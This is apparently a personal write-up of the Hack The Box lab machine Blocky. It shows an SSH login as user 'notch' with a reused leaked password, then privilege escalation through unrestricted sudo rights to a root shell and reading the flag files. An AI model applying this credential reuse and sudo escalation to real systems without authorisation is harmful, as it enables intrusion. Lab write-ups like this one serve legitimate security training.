# Foothold

- We know a user from wpscan : notch
- We can use the password from BlockyCore to ty and ssh to the box.
```bash
norman@kali ~/Hack-The-Box/machines/blocky ‹main*› 
╰─$ ssh notch@10.10.10.37 
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Tue Apr 13 09:00:55 2021 from 10.10.14.5
notch@Blocky:~$ 

```
- We can cat out the user.txt


# Priv Esc

- We can run `sudo -l` before running linpeas.
```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL

```
- Just run `sudo bash` or `sudo -i`
```bash
notch@Blocky:~$ sudo bash
root@Blocky:~# ls
minecraft  user.txt
root@Blocky:~# cd /root
root@Blocky:/root# cat root.txt | wc -c
32
root@Blocky:/root# 

```
- Cat out root.txt